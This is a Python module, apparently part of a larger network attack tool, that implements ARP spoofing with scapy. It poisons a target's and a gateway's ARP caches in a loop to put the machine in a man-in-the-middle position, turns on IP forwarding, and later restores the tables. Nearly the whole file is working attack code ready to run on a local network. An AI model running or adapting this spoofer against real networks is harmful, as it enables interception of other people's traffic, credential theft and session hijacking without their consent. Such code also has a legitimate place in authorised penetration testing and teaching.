"""ARP spoofing para posicionarnos como man-in-the-middle entre un objetivo
y el gateway. Al parar, restaura las tablas ARP legitimas."""
import threading

from scapy.all import ARP, getmacbyip, send

from core.bus import bus


def enable_ip_forward() -> None:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception as e:
        bus.emit({"type": "error", "msg": f"No se pudo habilitar ip_forward: {e}"})


class ArpSpoofer:
    def __init__(self, target_ip: str, gateway_ip: str, iface: str, interval: float = 2.0):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.interval = interval
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self.target_mac: str | None = None
        self.gateway_mac: str | None = None
        self._ipfwd_prev: str | None = None
        self._started = False

    def _poison(self) -> None:
        # Al objetivo le decimos que nosotros somos el gateway.
        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip),
             iface=self.iface, verbose=0)
        # Al gateway le decimos que nosotros somos el objetivo.
        send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip),
             iface=self.iface, verbose=0)

    def _restore(self) -> None:
        # Restauracion robusta: unicast a cada parte y broadcast, con varias
        # repeticiones espaciadas para asegurar que las tablas ARP se corrigen.
        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                 psrc=self.gateway_ip, hwsrc=self.gateway_mac),
             count=8, inter=0.5, iface=self.iface, verbose=0)
        send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                 psrc=self.target_ip, hwsrc=self.target_mac),
             count=8, inter=0.5, iface=self.iface, verbose=0)
        send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                 psrc=self.gateway_ip, hwsrc=self.gateway_mac),
             count=8, inter=0.5, iface=self.iface, verbose=0)
        send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                 psrc=self.target_ip, hwsrc=self.target_mac),
             count=8, inter=0.5, iface=self.iface, verbose=0)

    def _run(self) -> None:
        while not self._stop.is_set():
            self._poison()
            bus.emit({"type": "arp",
                      "msg": f"Envenenando {self.target_ip} <-> {self.gateway_ip}"})
            self._stop.wait(self.interval)

    def start(self) -> None:
        self.target_mac = getmacbyip(self.target_ip)
        self.gateway_mac = getmacbyip(self.gateway_ip)
        if not self.target_mac or not self.gateway_mac:
            raise RuntimeError("No se pudo resolver la MAC del objetivo o del gateway")
        # Guardamos el valor previo de ip_forward para restaurarlo al parar.
        try:
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                self._ipfwd_prev = f.read().strip()
        except Exception:
            self._ipfwd_prev = None
        enable_ip_forward()
        self._started = True
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        bus.emit({"type": "arp", "msg": f"MITM activo contra {self.target_ip}"})

    def stop(self) -> None:
        if not self._started:
            return
        self._started = False
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=5)
        if self._thread and self._thread.is_alive():
            # El hilo no murio: restaurar ahora seria contraproducente porque
            # seguira envenenando despues de nuestras ARP de restauracion.
            bus.emit({"type": "error",
                      "msg": "Hilo ARP seguia vivo tras join(5); se omite la restauracion"})
        else:
            try:
                self._restore()
            except Exception:
                pass
        # Restaurar ip_forward al valor original (solo si lo llegamos a tocar).
        if self._ipfwd_prev is not None:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write(self._ipfwd_prev)
            except Exception:
                pass
        bus.emit({"type": "arp", "msg": "MITM detenido, tablas ARP restauradas"})
